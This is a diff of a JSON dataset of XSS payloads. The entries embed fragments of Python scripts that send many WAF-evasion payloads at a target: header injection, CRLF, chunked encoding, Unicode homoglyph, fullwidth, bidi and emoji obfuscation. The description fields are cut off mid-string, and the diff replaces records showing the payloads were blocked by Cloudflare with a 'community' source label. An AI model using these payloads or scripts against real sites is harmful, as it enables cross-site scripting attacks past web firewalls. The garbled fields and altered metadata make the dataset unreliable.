       "description": "HEADER:Referer:<img src=x onerror=alert(1)>',\n    'HEADER:Referer:javascript:alert(1)',\n    'HEADER:Referer:\"><script>alert(1)</script>',\n    # Payload in X-Forwarded-Host\n    'HEADER:X-Forwarded-Host:<svg/onload=alert(1)>.evil.com',\n    'HEADER:X-Forwarded-Host:\"><script>alert(1)</script>',\n    # Payload in Accept header\n    'HEADER:Accept:<svg/onload=alert(1)>',\n    # Payload in Content-Disposition\n    'HEADER:Content-Disposition:form-data; name=\"<svg/onload=alert(1)>\"',\n]\n\n# Fire header payloads\nfor hp in PAYLOADS:\n    if hp.startswith('HEADER:",
       "technique": "direct_injection",
       "source_file": "waf_round80_push.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0355",
@@ -1061,11 +691,7 @@
       "description": "<svg onx=() onload=self?.eval(atob(\"YWxlcnQoMSk=",
       "technique": "direct_injection",
       "source_file": "waf_round80_push.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0357",
@@ -1075,11 +701,7 @@
       "description": "fw-all-img\": f'{FW[\"<",
       "technique": "direct_injection",
       "source_file": "waf_round47_cjk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0359",
@@ -1089,11 +711,7 @@
       "description": "fw-lt-only\": f'{FW[\"<",
       "technique": "direct_injection",
       "source_file": "waf_round47_cjk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0360",
@@ -1103,11 +721,7 @@
       "description": "fw-eq-img\": f'<img src=x onerror{FW[\"=",
       "technique": "direct_injection",
       "source_file": "waf_round47_cjk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0361",
@@ -1117,11 +731,7 @@
       "description": "fw-mix-2\": f'{FW[\"<",
       "technique": "direct_injection",
       "source_file": "waf_round47_cjk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0363",
@@ -1131,11 +741,7 @@
       "description": "jp-wrap-img\": '日本語<img src=x onerror=alert(1)>テスト',\n    \"jp-wrap-script\": '試験<script>alert(1)</script>終了',\n    \"jp-long-before\": 'あ' * 1000 + '<svg/onload=alert(1)>',\n    \"jp-long-after\": '<svg/onload=alert(1)>' + 'い' * 1000,\n    \"jp-mixed\": 'ア' * 500 + '<svg/onload=alert(1)>' + 'イ' * 500,\n    \n    # Katakana that might confuse charset detection\n    \"jp-kata-alert\": 'アラート<svg/onload=alert(1)>',\n    \"jp-hira-focus\": 'フォーカス\" onfocus=alert(1) autofocus x=\"',\n    \n    # Japanese fullwidth event names\n    \"jp-fw-onload\": '<svg/ｏｎｌｏａｄ=alert(1)>',\n    \"jp-fw-onerror\": '<img src=x ｏｎｅｒｒｏｒ=alert(1)>',\n    \"jp-fw-onfocus\": '\" ｏｎｆｏｃｕｓ=alert(1) autofocus x=\"',\n    \n    # Halfwidth katakana (U+FF61-U+FF9F)\n    \"jp-hw-wrap\": 'ﾃｽﾄ<svg/onload=alert(1)>ﾃｽﾄ',\n}\n\nfor name, payload in jp_payloads.items():\n    if '\"' in payload and 'x=\"' in payload:\n        t(name, {\"attributeHtml\": payload})\n    else:\n        t(name, {\"globalHtml\": payload})\n    time.sleep(0.15)\n\n# POST versions\nfor name, payload in list(jp_payloads.items())[:5]:\n    if '\"' in payload and 'x=\"' in payload:\n        t(f\"POST-{name}\", {\"attributeHtml\": payload}, method=\"POST",
       "technique": "direct_injection",
       "source_file": "waf_round47_cjk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0364",
@@ -1145,11 +751,7 @@
       "description": "kr-long\": '한' * 1000 + '<svg/onload=alert(1)>',\n    \"kr-mixed\": '안녕하세요<img src=x onerror=alert(1)>감사합니다',\n    \n    # Chinese Simplified\n    \"cn-wrap\": '测试<svg/onload=alert(1)>测试',\n    \"cn-long\": '中' * 1000 + '<svg/onload=alert(1)>',\n    \"cn-mixed\": '你好世界<img src=x onerror=alert(1)>谢谢',\n    \n    # Chinese Traditional\n    \"tw-wrap\": '測試<svg/onload=alert(1)>測試',\n    \"tw-long\": '國' * 1000 + '<svg/onload=alert(1)>',\n    \n    # CJK Unified Ideographs Extension\n    \"cjk-ext-a\": '\\u3400' * 100 + '<svg/onload=alert(1)>',\n    \"cjk-ext-b\": '\\U00020000' * 50 + '<svg/onload=alert(1)>',\n    \n    # Korean Jamo (decomposed Hangul)\n    \"kr-jamo\": 'ㅎㅏㄴ' * 100 + '<svg/onload=alert(1)>',\n}\n\nfor name, payload in cjk_payloads.items():\n    t(name, {\"globalHtml\": payload})\n    time.sleep(0.15)\n\n# ══════════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 80)\nprint(\"47E: Fullwidth 'onload', 'onerror' etc. (Entire Event Name)",
       "technique": "direct_injection",
       "source_file": "waf_round47_cjk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0366",
@@ -1159,11 +761,7 @@
       "description": "fw-on-prefix2\": f'\" {to_fullwidth(\"on",
       "technique": "direct_injection",
       "source_file": "waf_round47_cjk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0367",
@@ -1173,11 +771,7 @@
       "description": "fw-alert-parens\": f'<svg/onload=alert{to_fullwidth(\"(1)",
       "technique": "direct_injection",
       "source_file": "waf_round47_cjk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0370",
@@ -1187,11 +781,7 @@
       "description": "<svg><animate onend=alert(1) attributeName=x dur=1s>',\n    '<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2>',\n    '<svg><set onbegin=alert(1) attributeName=x to=1>',\n    # SVG with script\n    '<svg><script>alert(1)</script></svg>',\n    '<svg><script>alert&#40;1&#41;</script></svg>',\n    '<svg><script>&#97;&#108;&#101;&#114;&#116;(1)</script></svg>',\n    # SVG event handlers\n    '<svg onload=alert(1)>',\n    '<svg/onload=alert(1)>',\n    '<svg onload=alert`1`>',\n    '<svg onload=(alert)(1)>',\n    '<svg onload=window.alert?.(1)>',\n    '<svg onload=[1].find(alert)>',\n    '<svg onload=.1|alert``>',\n    '<svg onload=confirm(1)>',\n    '<svg onload=prompt(1)>',\n    '<svg onload=print()>',\n    # SVG with xmlns\n    '<svg xmlns=\"http://www.w3.org/2000/svg\" onload=alert(1)>',\n    '<svg xmlns:xlink=\"http://www.w3.org/1999/xlink\"><image xlink:href=\"javascript:alert(1)\">',\n    # SVG foreignObject\n    '<svg><foreignObject><body onload=alert(1)></foreignObject></svg>',\n    '<svg><foreignObject><iframe srcdoc=\"<img src=x onerror=alert(1)>\"></foreignObject></svg>',\n    # MathML\n    '<math><maction actiontype=statusline>Click<mtext>javascript:alert(1)</mtext></maction></math>',\n    '<math><mi//teleport=alert(1)>X</mi></math>',\n    '<math href=\"javascript:alert(1)\">X</math>',\n    '<math><annotation-xml encoding=\"text/html\"><svg onload=alert(1)></annotation-xml></math>',\n    # Mixed SVG + MathML\n    '<svg><math><annotation-xml><img src=x onerror=alert(1)></annotation-xml></math></svg>',\n]\n\nfor p in NS_PAYLOADS:\n    get(p, label=\"ns-trick",
       "technique": "direct_injection",
       "source_file": "waf_round93_research3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0371",
@@ -1201,11 +791,7 @@
       "description": "<svg on= onload=alert(1)>',\n    '<svg onx=() onload=alert(1)>',\n    '<svg on onload=(alert)(1)>',\n    '<svg on onload=confirm(1)>',\n    '<svg on onload=prompt(1)>',\n    '<svg on onload=window.alert?.()>',\n    '<svg on onload=[1].find(alert)>',\n    '<svg on onload=.1|alert``>',\n    '<svg on onload=print()>',\n]\n\nfor p in SVG_ON:\n    get(p, label=\"svg-on",
       "technique": "direct_injection",
       "source_file": "waf_round93_research3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0374",
@@ -1215,11 +801,7 @@
       "description": "<img oNLy=1 src=x oNErrOR=prompt`1`//>',\n    '<Img Src=OnXSS OnErroR=confirm(document.cookie)>',\n    '<svg onx=() onload=window.alert?.()>',\n    '<img//////src=x oNlY=1 oNerror=alert(\"xss",
       "technique": "direct_injection",
       "source_file": "waf_round93_research3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0378",
@@ -1229,39 +811,7 @@
       "description": "%20oNLy=1%20oNErrOR=prompt`1`//>',\n    '<img//////src=x oNlY=1 oNerror=alert(1)//',\n    '<Img/Src/OnError=(alert)(1)>',\n    '<img longdesc=\"src=\\'x\\'onerror=alert(document.domain);//><img \" src=\\'showme\\'>',\n    '<img src=OnErRor OnErRor=(alert)(\"XSS",
       "technique": "direct_injection",
       "source_file": "waf_round71_oss.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0391",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "<svg/onload=alert(1)>",
-      "description": "<img src=x onerror=alert(1)>',\n    '<script>alert(1)</script>',\n    '<details open ontoggle=alert(1)>',\n    '<input onfocus=alert(1) autofocus>',\n    '<body onload=alert(1)>',\n]\n\nFUNCS = [\n    'alert(1)', 'confirm(1)', 'prompt(1)', 'print()',\n    'alert`1`', '(alert)(1)', 'window.alert(1)',\n    'self[\"alert",
-      "technique": "direct_injection",
-      "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0394",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "<svg",
-      "description": "/onload=",
-      "technique": "direct_injection",
-      "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0397",
@@ -1271,11 +821,7 @@
       "description": "%3C",
       "technique": "direct_injection",
       "source_file": "waf_round89_advanced4.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0407",
@@ -1285,11 +831,7 @@
       "description": "{', '}",
       "technique": "direct_injection",
       "source_file": "waf_round28_exploit.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0408",
@@ -1299,11 +841,7 @@
       "description": "{', '}",
       "technique": "direct_injection",
       "source_file": "waf_round28_exploit.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0416",
@@ -1313,11 +851,7 @@
       "description": "<img src=x onerror=alert(1)>',\n               '<Img/Src/OnError=(alert)(1)>', '<img src=OnErRor OnErRor=(alert)(1)>",
       "technique": "direct_injection",
       "source_file": "waf_round74_oss3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0417",
@@ -1327,11 +861,7 @@
       "description": "<img src=x onerror=alert(1)>',\n    '<Img/Src/OnError=(alert)(1)>', '<script>alert(1)</script>',\n]\n\nfor p in CHUNK_PAYLOADS:\n    body = f\"globalHtml={urllib.parse.quote(p)}\"\n    chunk = f\"{len(body):x}\\r\\n{body}\\r\\n0\\r\\n\\r\\n\"\n    raw_req(\n        b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n        b\"Content-Type: application/x-www-form-urlencoded\\r\\n\"\n        b\"Transfer-Encoding: chunked\\r\\n\"\n        b\"Connection: close\\r\\n\\r\\n\" + chunk.encode())\n    # Split into 2 chunks\n    half = len(body) // 2\n    part1 = body[:half]\n    part2 = body[half:]\n    multi_chunk = f\"{len(part1):x}\\r\\n{part1}\\r\\n{len(part2):x}\\r\\n{part2}\\r\\n0\\r\\n\\r\\n\"\n    raw_req(\n        b\"POST / HTTP/1.1\\r\\nHost: \" + HOST.encode() + b\"\\r\\n\"\n        b\"Content-Type: application/x-www-form-urlencoded\\r\\n\"\n        b\"Transfer-Encoding: chunked\\r\\n\"\n        b\"Connection: close\\r\\n\\r\\n\" + multi_chunk.encode())\n\nprint(f\"  Chunked done: {total} total",
       "technique": "encoding",
       "source_file": "waf_round74_oss3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0419",
@@ -1341,11 +871,7 @@
       "description": "/<img src=x onerror=alert(1)>',\n    '/<script>alert(1)</script>',\n    '/\"onmouseover=alert(1)//',\n    '/\"><svg/onload=alert(1)>',\n    '/%3Csvg/onload=alert(1)%3E',\n    '/%253Csvg/onload=alert(1)%253E',\n]\n\nfor path in PATH_PAYLOADS:\n    enc = urllib.parse.quote(path, safe='/",
       "technique": "direct_injection",
       "source_file": "waf_round74_oss3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0422",
@@ -1355,11 +881,7 @@
       "description": "attributeHtml\": \"test\"}, show=True)\nif body:\n    # Find all script tags and inline JS\n    scripts = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL)\n    print(f\"\\n  Found {len(scripts)} script blocks",
       "technique": "direct_injection",
       "source_file": "waf_round18.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0424",
@@ -1369,11 +891,7 @@
       "description": "\" onfocus=alert(1) x=\"",
       "technique": "direct_injection",
       "source_file": "waf_round18.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0429",
@@ -1383,11 +901,7 @@
       "description": "<img src=x onerror=alert(1)>',\n    '<script>eval(atob(\"YWxlcnQoMSk=",
       "technique": "direct_injection",
       "source_file": "waf_round80_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0430",
@@ -1397,11 +911,7 @@
       "description": "%0d%0a%0d%0a<script>alert(1)</script>',\n    '%0d%0aX-Injected:%20<svg/onload=alert(1)>',\n    '\\\\r\\\\nContent-Type: text/html\\\\r\\\\n\\\\r\\\\n<img src=x onerror=alert(1)>',\n    '\\r\\nContent-Type: text/html\\r\\n\\r\\n<svg/onload=alert(1)>',\n]\n\nfor crlf in CRLF_PAYLOADS:\n    # In URL path\n    raw_req(f\"GET /{crlf} HTTP/1.1\\r\\nHost: {HOST}\\r\\nConnection: close\\r\\n\\r\\n\".encode('utf-8', errors='replace",
       "technique": "encoding",
       "source_file": "waf_round80_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0433",
@@ -1411,11 +921,7 @@
       "description": "<img src=x onerror=alert(1)>',\n    '<script>alert(1)</script>',\n]\n\nJUNK_CHARS = ['\\x00', '\\x01', '\\x02', '\\x03', '\\x04', '\\x05', '\\x06', '\\x07',\n              '\\x08', '\\x0b', '\\x0c', '\\x0e', '\\x0f', '\\x10', '\\x7f',\n              '\\xad', '\\u200b', '\\u200c', '\\u200d', '\\ufeff', '\\u00a0",
       "technique": "direct_injection",
       "source_file": "waf_round80_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0434",
@@ -1425,11 +931,7 @@
       "description": "/<img%20src=x%20onerror=alert(1)>',\n    '/\"><script>alert(1)</script>',\n    '/%3Csvg%20onload=alert(1)%3E',\n    '/%253Csvg%2520onload%253Dalert(1)%253E',\n    '/..%2f..%2f<script>alert(1)</script>',\n    '/.%00/<svg/onload=alert(1)>',\n    '/;/<svg/onload=alert(1)>',\n    '/%2e%2e/<svg/onload=alert(1)>',\n    '/<svg/onload=eval(atob(\"YWxlcnQoMSk=",
       "technique": "direct_injection",
       "source_file": "waf_round80_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0439",
@@ -1439,11 +941,7 @@
       "description": "<img src=x onerror=[][\"find",
       "technique": "direct_injection",
       "source_file": "waf_round80_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0440",
@@ -1453,11 +951,7 @@
       "description": "<img src=x onerror=eval(atob`YWxlcnQoMSk=`)>',\n]\n\nfor p in FINAL_COMMUNITY:\n    get(p)\n    post(p)\nprint(f\"  Final community done: {total} total",
       "technique": "direct_injection",
       "source_file": "waf_round80_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0445",
@@ -1467,11 +961,7 @@
       "description": "html-img-on`error\": '<img src=x on`error=alert(1)>',\n    \"html-input-on`focus\": '<input on`focus=alert(1) autofocus>',\n    \"html-div-on`click\": '<div on`click=alert(1)>click</div>',\n    \n    # With brace\n    \"html-svg-on{load\": '<svg on{load=alert(1)>',\n    \"html-img-on{error\": '<img src=x on{error=alert(1)>',\n    \n    # Backtick AFTER event name (onfocus` vs on`focus)\n    \"html-input-onfocus`\": '<input onfocus`=alert(1) autofocus>',\n    \"html-svg-onload`\": '<svg onload`=alert(1)>',\n    \n    # Template literal abuse — backtick as JS template\n    \"html-svg-onload-bt\": '<svg onload=`alert(1)`>',\n    \n    # Self-close + on` via attributeHtml\n    \"sc-svg-on`load\": {\"attributeHtml\": '\"/><svg on`load=alert(1)'},\n    \"sc-img-on`error\": {\"attributeHtml\": '\"/><img src=x on`error=alert(1)'},\n    \"sc-input-on`focus\": {\"attributeHtml\": '\"/><input on`focus=alert(1) autofocus'},\n    \n    # Self-close with brace\n    \"sc-svg-on{load\": {\"attributeHtml\": '\"/><svg on{load=alert(1)'},\n    \"sc-img-on{error\": {\"attributeHtml\": '\"/><img src=x on{error=alert(1)'},\n}\n\nfor name, payload in html_backtick.items():\n    if isinstance(payload, dict):\n        t(name, payload)\n    else:\n        t(name, {\"globalHtml\": payload})\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 75)\nprint(\"27E: POST Versions of Passing Patterns",
       "technique": "direct_injection",
       "source_file": "waf_round27_gaps.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0454",
@@ -1481,11 +971,7 @@
       "description": "e', 'o'\n    cyrillic = bp.replace('a', '\\u0430",
       "technique": "direct_injection",
       "source_file": "waf_round79_cross3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0457",
@@ -1495,11 +981,7 @@
       "description": "<img src=x onerror=alert(1)>',\n    '<script>alert(1)</script>',\n    'eval(atob(\"YWxlcnQoMSk=",
       "technique": "direct_injection",
       "source_file": "waf_round79_cross3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0459",
@@ -1509,25 +991,7 @@
       "description": "<img src=x onerror=alert(1)>',\n    '<script>alert(1)</script>',\n    '<!--><svg+onload=top[/al/.source+/ert/.source](1)>',\n    '<details/open/ontoggle=\"self[\\'ale\\'+\\'rt\\",
       "technique": "direct_injection",
       "source_file": "waf_round79_cross3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0461",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "<svg",
-      "description": "<SVG', '<img', '<IMG', '<script', '<SCRIPT',\n                'onload=', 'onerror=', 'onfocus=', 'onclick=',\n                'javascript:",
-      "technique": "direct_injection",
-      "source_file": "waf_round48_52.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0462",
@@ -1537,11 +1001,7 @@
       "description": "cyrillic-onload\": f'<svg/{cyrillic_onload}=alert(1)>',\n    \n    # Cyrillic 'o' in onerror\n    \"cyrillic-o-nerror\": f'<img src=x \\u043enerror=alert(1)>',\n    \n    # Cyrillic 'a' in alert\n    \"cyrillic-a-lert\": f'<svg/onload=\\u0430lert(1)>',\n    \n    # Cyrillic 's' in script\n    \"cyrillic-s-cript\": f'<\\u0455cript>alert(1)</\\u0455cript>',\n    \n    # Full Cyrillic event name\n    \"cyrillic-full-on\": f'\" {cyrillic_on}focus=alert(1) autofocus x=\"',\n    \n    # Greek homoglyphs\n    \"greek-SVG\": f'<\\u03a3VG/onload=alert(1)>',  # ΣVG\n    \"greek-IMG\": f'<\\u0399MG src=x onerror=alert(1)>',  # ΙMG\n    \n    # Mix Cyrillic and Latin\n    \"mix-svg-cyrillic\": f'<\\u0455vg/\\u043enload=alert(1)>',  # ѕvg/оnload\n    \"mix-img-cyrillic\": f'<img \\u0455rc=x \\u043enerror=alert(1)>',\n    \n    # Armenian homoglyphs\n    \"armenian-o\": f'<svg/\\u0585nload=alert(1)>',  # օnload (Armenian o)\n    \n    # Attr breakout with Cyrillic\n    \"attr-cyrillic-on\": f'\" {cyrillic_on}focus=alert(1) autofocus x=\"',\n    \"attr-cyrillic-onfocus\": f'\" \\u043enfocus=alert(1) autofocus x=\"',\n}\n\nfor name, payload in homo_payloads.items():\n    if 'x=\"' in payload:\n        t(name, {\"attributeHtml\": payload})\n    else:\n        t(name, {\"globalHtml\": payload})\n    # Also POST\n    if 'x=\"' in payload:\n        t(f\"POST-{name}\", {\"attributeHtml\": payload}, method=\"POST",
       "technique": "direct_injection",
       "source_file": "waf_round48_52.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0464",
@@ -1551,11 +1011,7 @@
       "description": "bold-full\": f'<{to_math_bold(\"svg",
       "technique": "direct_injection",
       "source_file": "waf_round48_52.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0465",
@@ -1565,11 +1021,7 @@
       "description": "italic-onerror\": f'<img src=x {to_math_italic(\"onerror",
       "technique": "direct_injection",
       "source_file": "waf_round48_52.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0467",
@@ -1579,11 +1031,7 @@
       "description": "italic-attr-onfocus\": f'\" {to_math_italic(\"onfocus",
       "technique": "direct_injection",
       "source_file": "waf_round48_52.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0468",
@@ -1593,11 +1041,7 @@
       "description": "italic-on-prefix\": f'<svg/{to_math_italic(\"on",
       "technique": "direct_injection",
       "source_file": "waf_round48_52.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0469",
@@ -1607,11 +1051,7 @@
       "description": "bidi-lro-onload\": f'<svg/{LRO}onload{PDF}=alert(1)>',\n    \"bidi-rlm-onload\": f'<svg/on{RLM}load=alert(1)>',\n    \"bidi-lrm-onload\": f'<svg/on{LRM}load=alert(1)>',\n    \n    # BiDi between on and load\n    \"bidi-rlo-between\": f'<svg/on{RLO}load=alert(1)>',\n    \"bidi-lro-between\": f'<svg/on{LRO}load=alert(1)>',\n    \n    # BiDi around entire payload\n    \"bidi-wrap-rlo\": f'{RLO}<svg/onload=alert(1)>{PDF}',\n    \"bidi-wrap-lro\": f'{LRO}<svg/onload=alert(1)>{PDF}',\n    \n    # BiDi in attr breakout\n    \"bidi-attr-rlm\": f'\" on{RLM}focus=alert(1) autofocus x=\"',\n    \"bidi-attr-lrm\": f'\" on{LRM}focus=alert(1) autofocus x=\"',\n    \"bidi-attr-rlo\": f'\" {RLO}onfocus{PDF}=alert(1) autofocus x=\"',\n}\n\nfor name, payload in bidi_payloads.items():\n    if 'x=\"' in payload:\n        t(name, {\"attributeHtml\": payload})\n    else:\n        t(name, {\"globalHtml\": payload})\n    time.sleep(0.1)\n\n# ══════════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 80)\nprint(\"51A: Combining Characters / Diacritical Marks",
       "technique": "direct_injection",
       "source_file": "waf_round48_52.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0470",
@@ -1621,11 +1061,7 @@
       "description": "emoji-long\": '🔥' * 500 + '<svg/onload=alert(1)>',\n    \"emoji-flags\": '🇯🇵🇰🇷🇨🇳🇺🇸<svg/onload=alert(1)>',\n    \"emoji-zwj\": '👨‍👩‍👧‍👦' * 100 + '<svg/onload=alert(1)>',\n    \n    # Emoji INSIDE tag name\n    \"emoji-in-tag\": '<sv😀g/onload=alert(1)>',\n    \"emoji-in-event\": '<svg/on😀load=alert(1)>',\n    \"emoji-in-func\": '<svg/onload=al😀ert(1)>',\n    \n    # Regional indicator sequences (special multi-byte)\n    \"ri-before\": '\\U0001f1ef\\U0001f1f5' * 50 + '<svg/onload=alert(1)>',\n    \n    # Variation selectors on ASCII chars\n    \"vs15-lt\": '<\\ufe0esvg/onload=alert(1)>',\n    \"vs16-lt\": '<\\ufe0fsvg/onload=alert(1)>',\n    \"vs-onload\": '<svg/o\\ufe0en\\ufe0eload=alert(1)>',\n}\n\nfor name, payload in emoji_payloads.items():\n    t(name, {\"globalHtml\": payload})\n    time.sleep(0.1)\n\n# ══════════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 80)\nprint(\"52B: Mixed Script Confusion — Final Creative Attempts",
       "technique": "direct_injection",
       "source_file": "waf_round48_52.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0471",
@@ -1635,11 +1071,7 @@
       "description": "thai-long\": 'ก' * 500 + '<svg/onload=alert(1)>',\n    \n    # Arabic\n    \"arabic-wrap\": 'اختبار<svg/onload=alert(1)>اختبار',\n    \"arabic-long\": 'ا' * 500 + '<svg/onload=alert(1)>',\n    \"arabic-rtl\": '\\u0627\\u0644\\u0627\\u062e\\u062a\\u0628\\u0627\\u0631<svg/onload=alert(1)>',\n    \n    # Hebrew\n    \"hebrew-wrap\": 'בדיקה<svg/onload=alert(1)>בדיקה',\n    \n    # Devanagari (Hindi)\n    \"hindi-wrap\": 'परीक्षण<svg/onload=alert(1)>परीक्षण',\n    \n    # Mix ALL scripts\n    \"multi-script\": '日本語한국어中文ไทยعربي<svg/onload=alert(1)>',\n    \"multi-long\": ('日한中ไع' * 200) + '<svg/onload=alert(1)>',\n    \n    # Zalgo text (heavy combining characters)\n    \"zalgo\": 'ẗ̴̢̧͎̣̪̺͙͎̩̗̗̟̮̖́̊̈́̐̔́̈́̚ë̸̡̢̛̬̦̗̝̼̪́͊̂̽̌̈́̃̂̃̕s̷̨̛̙̝̲̱̱̤̱̖̯̊̂͋̈t̸̨̛̲̝̪̬̦̙̯̊͊̈<svg/onload=alert(1)>',\n    \n    # Very long mixed CJK + XSS at various positions\n    \"cjk-start-xss\": '<svg/onload=alert(1)>' + '漢字かなカナ' * 500,\n    \"cjk-mid-xss\": '漢字' * 250 + '<svg/onload=alert(1)>' + 'かな' * 250,\n    \"cjk-end-xss\": '漢字かなカナ' * 500 + '<svg/onload=alert(1)>',\n}\n\nfor name, payload in mixed_payloads.items():\n    t(name, {\"globalHtml\": payload})\n    t(f\"POST-{name}\", {\"globalHtml\": payload}, method=\"POST",
       "technique": "direct_injection",
       "source_file": "waf_round48_52.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "xss-0472",
@@ -1649,11 +1081,7 @@
